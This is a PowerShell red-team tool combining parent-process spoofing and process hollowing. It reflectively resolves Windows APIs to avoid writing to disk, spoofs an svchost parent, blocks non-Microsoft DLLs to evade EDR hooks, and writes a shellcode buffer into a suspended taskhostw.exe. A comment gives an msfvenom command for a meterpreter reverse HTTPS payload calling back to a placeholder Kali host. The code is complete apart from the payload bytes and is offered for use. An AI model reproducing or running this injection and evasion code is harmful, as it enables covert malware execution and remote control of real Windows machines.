<#
Script: PPID Spoofing & Process Hollowing v1.2 (Reflective)
Version: 1.2
Author: @bowtiejicode (https://github.com/bowtiejicode)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None


====== Change Log ======
2022-12-12 -- v1.2
   - Converted the script to reflective
   - Disk is lava: Resolved v1.1 issue on temporarly artifacts written to disk.

2022-12-10 -- v1.1
   - Integrated with PPID
   - Resolved v1.0 issue on alerting Windows Defender upon spawning cmd.exe from meterpreter shell
   - Temporarly artifacts being written to disk which can trigger certain AV/EDR

2021-09-18 -- v1.0
   - Simple Process Hollowing
   - Windows Defender alert pop up when launch cmd.exe but our meterpreter shell will not die (probably work to resolve this in next ver)
#>


#region Variables
    
    # Object for holding Win32 struct definitions
    $Win32StructTypes = New-Object System.Object
    
    $parentProcessId = 0
    $parentProcessName = "svchost"
    $Binary = "C:\Windows\System32\taskhostw.exe"

    #msfvenom -p windows/x64/meterpreter/reverse_https LHOST=KALI_IP LPORT=443 EXITFUNC=thread -f ps1
    [Byte[]] $buf = "Your payload here"


#endregion Variables

function PrintArt {

Write-Host "                                       _____  _____ _____ _____      "                      
Write-Host "                                      |  __ \|  __ \_   _|  __ \            "               
Write-Host "                                      | |__) | |__) || | | |  | |            "              
Write-Host "          ((((((((*                   |  ___/|  ___/ | | | |  | |              /#######(         "
Write-Host "       (((((((((((((((,               | |    | |    _| |_| |__| |              *##############(      "
Write-Host "      ((((((((((((((((((((            |_|    |_|   |_____|_____/           .##################((     "
Write-Host "     (((((((((((((((((((((((((                                         ######################(((    "
Write-Host "     (((((((((((((((((((((((((((((     **                   /,     ##########################(((    "
Write-Host "     ((((((((((((((((((((((((((((((((,     ************,,,     *#############################(((    "
Write-Host "     ((((((((((((((((  ,(((((((((((((((,   ************,,,   ###############(,  #############(((    "
Write-Host "     (((((((((((((((*                      ************,,,   ,                  (############(((    "
Write-Host "     ((((((((((((((((((((((((((((((,       ************,,,       ,###########################(((    "
Write-Host "     ((((((((((((((((((((((((((((((((((,   ************,,,   ################################(((    "
Write-Host "     (((((((((((((((((((((((((((((.        ************,,,        ,(#########################(((    "
Write-Host "     (((((((((((((((*                 ,.   ***********,,,,   /,                 #############(((    "
Write-Host "     (((((((((((((((( ,((((((((((((((((,   ,,,,,,,,,,,,,,,   (((##############, #############(((    "
Write-Host "     ((((((((((((((((((((((((((((((((      ,,,,,,,,,,,,,,,      ((((########################((((    "
Write-Host "     ((((((((((((((((((((((((((((.     **                   /*     *((((###################(((((    "
Write-Host "     ((((((((((((((((((((((((/     *///                      .///,     ((((#############((((((((    "
Write-Host "      ((((((((((((((((((((     .////*                           /////      ((((((((((((((((((((     "
Write-Host "       (((((((((((((((      //**.                                   ,**//      ((((((((((((((/      "
Write-Host "          *(((((((        _____                _    _       _ _                      .(((((((.         "
Write-Host "                         |  __ \              | |  | |     | | |              "
Write-Host "                         | |__) | __ ___   ___| |__| | ___ | | | _____      __"
Write-Host "                         |  ___/ '__/ _ \ / __|  __  |/ _ \| | |/ _ \ \ /\ / /"
Write-Host "                         | |   | | | (_) | (__| |  | | (_) | | | (_) \ V  V / "
Write-Host "                         |_|   |_|  \___/ \___|_|  |_|\___/|_|_|\___/ \_/\_/  "

Write-Host " "
Write-Host "PPID Spoofing & Process Hollowing v1.2 (Reflective)"
Write-Host "Author: @bowtiejicode (https://github.com/bowtiejicode)"
}

function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
 Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}
function getDelegateType {
 Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
 $type = [AppDomain]::CurrentDomain.
 DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
 $type.
 DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
 $type.
 DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}

function DefineStruct{
    Param ($ModuleBuilder, $Name, $StructMembers)
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType($Name, $Attributes, [System.ValueType])
    for($i = 0; $i -lt $StructMembers.Length; $i++){
        [void]$TypeBuilder.DefineField($structMembers[$i][0], $structMembers[$i][1], 'Public')
    }
    $CreatedType = $TypeBuilder.CreateType()
    $Win32StructTypeName = $Name + 'Type'
    $Win32StructTypes | Add-Member -MemberType NoteProperty -Name $Win32StructTypeName -Value $CreatedType

}

PrintArt 

#region Module Builder
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName(([guid]::NewGuid().ToString()))
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run) # Only run in memory
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(([guid]::NewGuid().ToString()), $False)
#endregion Module Builder


#region defining structs

#region SECURITY_ATTRIBUTES struct
    $StructMembers = ('Length', [Int32]), ('bInheritHandle', [Bool]), ('lpSecurityDescriptor', [IntPtr])
    DefineStruct $ModuleBuilder 'SecurityAttributes' $StructMembers
#endregion SECURITY_ATTRIBUTES struct

#region PROCESS_BASIC_INFORMATION struct
    $StructMembers = ('hProcess', [IntPtr]), ('hThread', [IntPtr]), ('dwProcessId', [Int]), ('dwThreadId', [Int])
    DefineStruct $ModuleBuilder 'ProcessInformation' $StructMembers
#endregion PROCESS_BASIC_INFORMATION struct

#region PROCESS_INFORMATION  struct
    $StructMembers = ('Reserved1', [IntPtr]), ('PebAddress', [IntPtr]), ('Reserved2', [IntPtr]), ('Reserved3', [IntPtr]), ('UniquePid', [IntPtr]), ('MoreReserved', [IntPtr])
    DefineStruct $ModuleBuilder 'ProcessBasicInformation' $StructMembers
#endregion PROCESS_INFORMATION struct

#region STARTUPINFO  struct
    $StructMembers = ('cb', [Int32]), ('lpReserved', [String]), ('lpDesktop', [String]), ('lpTitle', [String]), ('dwX', [Int32]), ('dwY', [Int32]), ('dwXSize', [Int32]), ('dwYSize', [Int32]), ('dwXCountChars', [Int32]), ('dwYCountChars', [Int32]), ('dwFillAttribute', [Int32]), ('dwFlags', [Int32]), ('wShowWindow', [Int16]), ('cbReserved2', [Int16]), ('lpReserved2', [IntPtr]), ('hStdInput', [IntPtr]), ('hStdOutput', [IntPtr]), ('hStdError', [IntPtr])
    DefineStruct $ModuleBuilder 'StartUpInfo' $StructMembers
#endregion STARTUPINFO struct


#region STARTUPINFOEX  struct
    $StructMembers = ('StartupInfo', $Win32StructTypes.StartUpInfoType), ('lpAttributeList', [IntPtr])
    DefineStruct $ModuleBuilder 'StartUpInfoEx' $StructMembers
#endregion STARTUPINFOEX struct

#endregion defining structs


#region API Constants
# STARTUPINFOEX Constants
    $PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
    $PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007

# STARTUPINFO Constants
    $STARTF_USESTDHANDLES = 0x00000100
    $STARTF_USESHOWWINDOW = 0x00000001
    $SW_HIDE = 0x0000

# CreateProcess dwCreationFlags Constants
    $EXTENDED_STARTUPINFO_PRESENT = 0x00080000
    $CREATE_NO_WINDOW = 0x08000000
    $CREATE_SUSPENDED = 0x00000004

# DupHandle
    $DUPLICATE_CLOSE_SOURCE = 0x00000001
    $DUPLICATE_SAME_ACCESS = 0x00000002

# Policy Constant
    $PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000

#endregion Constants


#region Variables (part 2)

    [IntPtr]$hStdOutRead = [IntPtr]::Zero
    [IntPtr]$hStdOutWrite = [IntPtr]::Zero
    [IntPtr]$hDupStdOutWrite = [IntPtr]::Zero

    [IntPtr]$lpValueProc = [IntPtr]::Zero
    [IntPtr]$hSourceProcessHandle = [IntPtr]::Zero
    [IntPtr]$lpSize = [IntPtr]::Zero

#endregion Variables (part 2)

#region ReferenceTypes
    [Type]$SecurityAttributesRefType = ($Win32StructTypes.SecurityAttributesType).MakeByRefType()
    [Type]$ProcessInformationRefType = ($Win32StructTypes.ProcessInformationType).MakeByRefType()
    [Type]$ProcessBasicInformationRefType = ($Win32StructTypes.ProcessBasicInformationType).MakeByRefType()
    [Type]$StartUpInfoRefType = ($Win32StructTypes.StartUpInfoType).MakeByRefType()
    [Type]$StartUpInfoExRefType = ($Win32StructTypes.StartUpInfoExType).MakeByRefType()
    [Type]$IntPtrRefType = [IntPtr].MakeByRefType()
    [Type]$UInt32RefType = [UInt32].MakeByRefType()
#endregion

    # Let's find a parent process that has the same integrity level as your running process
    # If the parent process has same integrity level, you should be able to read the PriorityClass member as "Normal"
    $plausibleProcesses = Get-Process $parentProcessName | Where-Object {$_.PriorityClass -eq "Normal"}
    $noOfPlausibleProcesses = $plausibleProcesses.Length
    if ($noOfPlausibleProcesses -eq 0){
        throw "[!] Failed to find a good candidate for parent process"
    }
    Write-Host " "
    Write-Host "[+] Found $noOfPlausibleProcesses candidates for $parentProcessName" 
    $randomNumber = Get-Random -Minimum -0 -Maximum ($plausibleProcesses.Length - 1) # Why not? :)
    $parentProcessId = $plausibleProcesses[$randomNumber].Id
    Write-Host "[+] Selected parent process (PID: $parentProcessId) to spoof"
    if ($parentProcessId -eq 0){
        throw "[!] Parent processId still 0"
    }



    $saHandles = New-Object "SecurityAttributes"
    $saHandles.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($saHandles)
    $saHandles.bInheritHandle = $true
    $saHandles.lpSecurityDescriptor = [IntPtr]::Zero

    $siEx = New-Object "StartUpInfoEx"
    $siEx.StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($siEx)
    $siEx.StartupInfo.hStdError = $hStdOutWrite;
    $siEx.StartupInfo.hStdOutput = $hStdOutWrite;
    
    # Creating anonymous pipe
    # Note: All pipe handles are also closed when the process terminates.
    $succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreatePipe), (getDelegateType @($IntPtrRefType, $IntPtrRefType, $SecurityAttributesRefType ,[UInt32]) ([Bool]))).Invoke([ref]$hStdOutWrite, [ref] $hStdOutWrite, [ref] $saHandles, 0)
    if ($succ -eq $false){ throw "Failed to create pipe"}
    $succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll SetHandleInformation), (getDelegateType @([IntPtr], [UInt32], [UInt32]) ([Bool]))).Invoke($hStdOutWrite, 1 , 0)
    if ($succ -eq $false){ throw "Failed to sethandle"}
    
    # Determining size first
    $succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll InitializeProcThreadAttributeList), (getDelegateType @([IntPtr], [Int], [Int], $IntPtrRefType) ([Bool]))).Invoke([IntPtr]::Zero, 2, 0, [ref] $lpSize)
    
    # Allocating size and calling init attribute list for real
    $siEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)
    $succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll InitializeProcThreadAttributeList), (getDelegateType @([IntPtr], [Int], [Int], $IntPtrRefType) ([Bool]))).Invoke($siEx.lpAttributeList, 2, 0, [ref] $lpSize)
    if ($succ -eq $false){
        throw "[!] InitializeProcThreadAttributeList failed!"
    }

    # Lets prevent 3rd party (non-MS signed) DLLs from injecting into our process
    [IntPtr]$lpMitigationPolicy = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
    [System.Runtime.InteropServices.Marshal]::WriteInt64($lpMitigationPolicy, $PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
    $succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll UpdateProcThreadAttribute), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool]))).Invoke($siEx.lpAttributeList, 0, [IntPtr]$PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, $lpMitigationPolicy, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($succ -eq $false){
        throw "[!] Set process mitigation policy failed!"
    }

    # Open process with ProcessAccessFlags.CreateProcess -bor ProcessAccessFlags.DuplicateHandle
    [IntPtr]$parentHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [Bool], [Int]) ([IntPtr]))).Invoke(0x000000c0, $false, $parentProcessId)
   
    # Persist this value until attribute list is deleted
    $lpValueProc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValueProc, $parentHandle)

    # Updating attrib list...
    $succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll UpdateProcThreadAttribute), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool]))).Invoke($siEx.lpAttributeList, 0, [IntPtr]$PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, $lpValueProc, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($succ -eq $false){
        throw "[!] Failed to update attrib list!"
    }

    [IntPtr]$hCurrent = [System.Diagnostics.Process]::GetCurrentProcess().Handle

    # Opening parent process with ProcessAccessFlags.DuplicateHandle flag
    [IntPtr]$hNewParent = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [Bool], [Int]) ([IntPtr]))).Invoke(0x00000040, $true, $parentProcessId)
  
    # Duplicating current handle --> parent handle 
    $succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll DuplicateHandle), (getDelegateType @([IntPtr], [IntPtr], [IntPtr], $IntPtrRefType, [UInt32], [Bool], [UInt32]) ([Bool]))).Invoke($hCurrent, $hStdOutWrite, $hNewParent, [ref] $hDupStdOutWrite, 0, $true, $DUPLICATE_CLOSE_SOURCE -bor $DUPLICATE_SAME_ACCESS)
    if ($succ -eq $false){
        throw "[!] Duplicate handle failed!"
    }

    $siEx.StartupInfo.hStdError = $hDupStdOutWrite;
    $siEx.StartupInfo.hStdOutput = $hDupStdOutWrite;
    $siEx.StartupInfo.dwFlags = $STARTF_USESHOWWINDOW -bor $STARTF_USESTDHANDLES;
    $siEx.StartupInfo.wShowWindow = $SW_HIDE;
    
    # SECURITY_ATTRIBUTES Struct (Proc & Thread)
    $SecAttrProc = New-Object "SecurityAttributes"
    $SecAttrProc.length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttrProc)
    $SecAttrThread = New-Object "SecurityAttributes"
    $SecAttrThread.length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttrThread)
     
    # ProcessBasicInformation struct
    $bi = New-Object "ProcessBasicInformation"
    # ProcessInfo Struct
    $ProcessInfo = New-Object "ProcessInformation"

    # Making the process more realistic
    $CurrentPath = Split-Path -Path $Binary
    $CommandLine = Split-Path -Path $Binary -Leaf

  
    # Call CreateProcess
    # Beware of unquoted path in lpApplicationName ($Binary) https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#security-remarks
    [bool]$succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateProcessA), (getDelegateType @([String], [String], $SecurityAttributesRefType, $SecurityAttributesRefType, [Bool], [UInt32], [IntPtr], [String], $StartUpInfoExRefType ,$ProcessInformationRefType) ([Bool]))).Invoke($Binary, $CommandLine, [ref] $SecAttrProc, [ref] $SecAttrThread, $true, $EXTENDED_STARTUPINFO_PRESENT -bor $CREATE_NO_WINDOW -bor $CREATE_SUSPENDED, [IntPtr]::Zero, $CurrentPath, [ref] $siEx, [ref] $ProcessInfo)
    if ($succ -eq $false){
        throw "[!] Failed to create process"
    }

    $childPID = $ProcessInfo.dwProcessId
    Write-Host "[+] Created $CommandLine (PID: $childPID) under $parentProcessName (PID: $parentProcessId)"
    
    [UInt32]$tmp = 0
    [IntPtr]$hProcess = $ProcessInfo.hProcess
    [IntPtr]$s = [IntPtr]::Size * 6

    $ntstatus_int = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc ntdll.dll ZwQueryInformationProcess), (getDelegateType @([IntPtr], [Int], $ProcessBasicInformationRefType, [IntPtr], $UInt32RefType) ([Int]))).Invoke($hProcess, 0, [ref] $bi, $s, [ref] $tmp)
    
    [IntPtr]$ptrToImageBase = [IntPtr]($bi.PebAddress.ToInt64() + 0x10) 
    
    [Byte[]]$addrBuf = [System.Array]::CreateInstance([byte],[IntPtr]::Size)
    [IntPtr]$nRead = [IntPtr]::Zero
    $succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], $IntPtrRefType) ([Bool]))).Invoke($hProcess, $ptrToImageBase, $addrBuf, $addrBuf.Length, [ref] $nRead)
    if ($succ -eq $false){
        throw "[!] ReadProcessMemory for imageBase failed"
    }
    [IntPtr]$svchostBase = [IntPtr]([bitconverter]::ToInt64($addrBuf,0))
    [Byte[]]$data = [System.Array]::CreateInstance([byte],0x200) # Parse PE header
    $succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], $IntPtrRefType) ([Bool]))).Invoke($hProcess, $svchostBase, $data, $data.Length, [ref] $nRead)
    if ($succ -eq $false){
        throw "[!] ReadProcessMemory for svchostbase failed"
    }

    [UInt32]$e_lfanew_offset = [bitconverter]::ToUInt32($data,0x3C)
    [UInt32]$opthdr = $e_lfanew_offset + 0x28;
    [UInt32]$entrypoint_rva = [bitconverter]::ToUInt32($data, [Int32]$opthdr);
    [IntPtr]$addressOfEntryPoint = [IntPtr]($entrypoint_rva + $svchostBase.ToInt64())
    
    [IntPtr]$nWrite = [IntPtr]::Zero
    $succ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int32], $IntPtrRefType) ([Bool]))).Invoke($hProcess, $addressOfEntryPoint, $buf, $buf.Length, [ref] $nWrite)    
    if ($succ -eq $false){
        throw "[!] WriteProcessMemory failed"
    }
    
    $result = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ResumeThread), (getDelegateType @([IntPtr]) ([UInt32]))).Invoke($ProcessInfo.hThread)    
    if ($result -eq -1){
        throw "[!] Failed to resume thread"
    }
    Write-Host "[+] Completed"


